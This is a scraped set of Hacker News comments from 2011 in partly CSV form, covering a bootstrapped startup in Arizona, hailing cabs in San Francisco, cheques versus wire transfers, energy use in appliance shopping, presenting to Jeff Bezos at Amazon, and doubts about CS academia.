3139012,comment,3138610,3138610,6,0,strebel,,,"We are based in Arizona and bootstrapped.  I have made this analogy in the past: ""Arizona company's have to be hearty like a cactus with a 'real business' built on a sound model to cope with scarcity of resources. SV based funded companies are as plentiful as spring flowers are here in the desert but rarely make it through the summer heat""<p>Silly okay.. but I think it speaks to the culture. No one I know here in Arizona includes ""after our series A"" in their plans. A higher valuation seems to be the end goal for most startups in the Valley, and dramatically alters the way they do things.<p>Personally I would dread trying to outrun the burn rate funded companies operate under as 99% of them have no revenue or not enough to turn a profit.<p>We are forced to build a 'boring' business that can sustain itself from nearly day 1, which leads to a different culture entirely. We solve the revenue equation first, which makes things easier and less stressful in the long run.  My 2 cents and YMMV",1319187384

Choose nicer hotels and if the pickings are still slim, $5 to the doorman will resolve the problem pretty quickly.<p>Even less-nice hotels are good for cabs if they have a notable bar.  E.g., the W usually has very quick service, but it's a hike from anywhere good.<p>After your first few months in SF, you develop a skill for sniffing out cabs.  Good luck outside FiDi, Union Square, Market Street, Fisherman's Wharf and the feeder streets through North Beach, and the top of Nob Hill.  There are a lot of cabs in the Castro, the Mission, and Cow Hollow, but you need to be ruthless in leapfrogging other parties.<p>That said, just use Uber.  Don't bother with Cabulous and the like, because the inbound driver will flake if he's hailed and can drop the meter sooner.",1319186918

Cheques seems to be usual within the US, but I find them a nuisance when I am there, and people outside the US generally hate cheques, which are very expensive to negotiate.  Here in Germany, I shred US cheques for less than $100 and ask to have the money sent to a friend to the US instead; small cheques are simply not worth the bother.<p>A better way to handle this is to set up a wire transfer authority with your bank: you might need an overpriced business account to do this, but I have set one up with a regular home account.  The way it worked for me, about 10 years ago, is that I needed to go into the branch to authorise each recipient account, but once I had that, I could make transfers with a phone call, with a PIN for authorisation.  That was convenient enough, I dare say that most banks today have internet interfaces that might be more or less convenient than that.<p>If you are invoicing to Europe or other countries in the IBAN network (i.e., mostly S.E. Asia), consider getting a dollar-denominated account with a European bank: the fees for wire transfer should then be much lower than other routes.<p>Money brokers offer cheaper rates for wire transfers than retail banks.

The NEED/WANT for the product\n2. PRICE\n3. VISUAL APPEARANCE<p>I have also noticed(being a electronics/home appliance sales person for a year - extra university cash) that there is another ""thing"" that people look for and that's ""ENERGY CONSUMPTION"". For every ten customers i would get, 3-4 would query the energy consumption of these devices. I am not saying that price had no effect, but in today's world with escalating energy costs, fuel prices, more and more people are becoming conscious of the amount of energy they are consuming.<p>A lot of sites out there list products with each having a specs page to list the rated wattage(i smell some screen scraping coming). Are there people out there who shop for home appliances this way? i had a lady come to the store once, and she was looking for a dryer, after chatting for a while i could sense that the price wasn't much of an issue(within reason - i guess she knew she needed a dryer and there was no getting away from it). She eventually like a dryer with a 3000W rating(assuming she uses it for 4 hrs a day for 18-24 days a month, the yearly bill, yeah! is pretty high), but she based here decision on 2 things price, and visual styling. What amazes me is she did not work out electricity consumption, the amount of clothes she washes, how many people are in the family, i mean these are thing i would look for when buying a 3000W dryer.<p>I just can't seem to figure out if there are more people who would like to shop based on the energy consumption of the appliance?

3138924,comment,3138826,3138881,77,0,potatolicious,,,"I've presented to Bezos once. It went about the same as Yegge's experience, except I didn't have his balls to laugh in my CEO's face ;)<p>The whole thing felt like I was meeting the President - layer after layer of aides and executive assistants, tons of security, and briefings on where to sit, where to not sit, where to stand, where to not stand, look him in the eye when you shake his hand, etc etc. It was kind of surreal.<p>I haven't presented to any other big-corp CEO other than him, so I can't really draw any comparisons.<p>One thing Yegge brought up that I also felt the same about walking out of that room: Jeff is <i>really</i> smart, like <i>really, really</i> smart. I was warned about this beforehand and spent two weeks poring over every single detail, potential feature, <i>everything</i> about the idea I was presenting. He <i>still</i> managed to come out of left field with relevant questions that none of us had even thought of. So I can corroborate that side of the story.<p>The comparison to Liszt also seems apt - before we were even done presenting, he'd already grokked it to a surprising degree, and was already expanding upon the idea in out loud. You could <i>hear</i> my manager scribbling like a madman trying to get all of this down. This might not seem <i>especially</i> amazing, but the Director and VP level people I presented the very same idea to had not the same depth of insight. I remember being very impressed on the spot.<p>I'm no longer with Amazon, and I don't particularly want to go back - but that's not due to bad top management, IMO Bezos is one of the keenest tech CEOs around. He might be the closest thing we have left to Jobs.<p>To balance it out a bit and not make this seems like a complete Amazon love-fest: Jeff <i>loved</i> our idea, he gave us the green light right away. We left that room ecstatic thinking we were about to change the online retail experience forever.<p>Then middle management showed up. There was political infighting about who owns the project - it straddled multiple disciplines (hence why it was so groundbreaking), and there was a mixture of both hot-potato-oh-god-you-take-it and this-is-amazing-we-need-the-credit-on-this.<p>The teams that were interested were unwilling to yield to other teams that (rightfully, given their expertise and domain) wanted in, and some teams we needed support from kept punting it since it wasn't in their yearly plan (put together, well, a year or more ago). The project would have provided very powerfully tangible, very high-profile benefits to the customer, but said benefits weren't part of the metrics on which our department was getting judged, so at the VP level the willingness to devote resources was almost non-existent. There was lots of lip service given - especially about how a few people were able to hack together this <i>thing</i> and make it all the way to a Jeff Presentation.<p>But ultimately the project froze. It was, actually, probably <i>the</i> main reason I decided to leave Amazon for a smaller, more agile startup, where if the CEO wants something done, by golly, it's gettin' done.",1319184769

It feels like he came to believe academia was bullshit, but didn't want to hurt his close friends in academia.  (Which is fine!  You are using a throwaway account, no?)<p>Over time, I came to view CS academia as bullshit as well, but I am starting to reverse this view.  Academia is inefficient, anachronistic, political, bureaucratic, and doesn't do a very good job measuring its own output.  However, that seems to apply to countless other institutions, especially institutions with billions of dollars.<p>Is it possible that academia is a flawed system that sometimes has good results (e.g., new knowledge, startups, quality engineers) that would not have happened otherwise?  Or have new inventions like incubators or online education arrived that make it easier to achieve those good results without the old, flawed system?",1319184743
